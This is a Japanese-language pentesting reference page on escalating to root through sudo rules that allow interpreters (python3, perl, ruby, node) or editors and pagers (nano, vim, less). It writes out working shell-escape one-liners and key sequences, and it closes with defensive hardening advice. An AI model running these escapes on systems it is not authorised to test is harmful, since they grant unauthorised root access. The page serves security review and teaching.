# Sudoコマンド悪用

{{#include ../../banners/hacktricks-training.md}}

## Sudoで許可されたインタープリタ

`sudo -l` によってユーザーが root としてインタープリタを実行できる場合、直接的な code execution とみなします。インタープリタは任意の code を実行するように設計されているため、`python3`、`perl`、`ruby`、`lua`、`node`、または類似のバイナリを許可するルールは、引数が厳密に制限および検証されていない限り、通常は root コマンドの実行と同等です。

一般的な確認フロー:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
その他のインタープリターの例:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
正確なパスが重要です。sudo ルールで `/usr/bin/python3` が許可されている場合は、検証時にその正確なパスを使用します：
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudo-allowed editors

`sudo -l` によってユーザーが root として interactive editor を実行できる場合、それを無害なファイル編集権限ではなく、command-execution surface として扱います。Editors は多くの場合、editor 内から shell commands の実行、任意のファイルの読み取り・書き込み、または外部ヘルパーの呼び出しを行えます。

一般的な review flow:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano コマンド実行

`nano` が sudo 経由で許可されている場合、エディターインターフェースからコマンド実行が可能な場合があります:
```text
Ctrl+R
Ctrl+X
```
次に、以下のようなコマンドを実行します：
```bash
id
/bin/sh
```
一部の端末では、interactive shell の標準ストリームをリダイレクトする必要がある場合があります：
```bash
reset; /bin/sh 1>&0 2>&0
```
キーシーケンスは nano のバージョンやビルドオプションによって異なる場合がありますが、security issue は同じです。editor は root として実行され、外部コマンドを呼び出せます。

### その他の一般的な editor escape

Vim-style editor では、一般的に `:!` を使用した command execution が可能です。
```text
:!/bin/sh
```
`less` などの Pager では、shell execution も可能です:
```text
!/bin/sh
```
## 防御に関する注意事項

- sudo を介してインタープリタや対話型エディタを許可しない。
- 1つの限定的な管理操作だけを実行する、root 所有の固定ラッパーを優先する。
- インタープリタが避けられない場合は、正確なスクリプトパスに限定し、ユーザーが制御できる引数、書き込み可能な import、`PYTHONPATH`、安全でない環境変数の引き継ぎを防止する。
- ファイル編集が必要な場合は、正確なファイルパスに限定し、パッチ適用済みの sudo バージョンと厳格な環境処理による `sudoedit` の使用を検討する。
- `SETENV`、`env_keep`、書き込み可能な作業ディレクトリ、書き込み可能なモジュール/import パス、`NOEXEC`、`use_pty`、logging を確認する。ただし、これらを完全な sandbox とみなしてはならない。
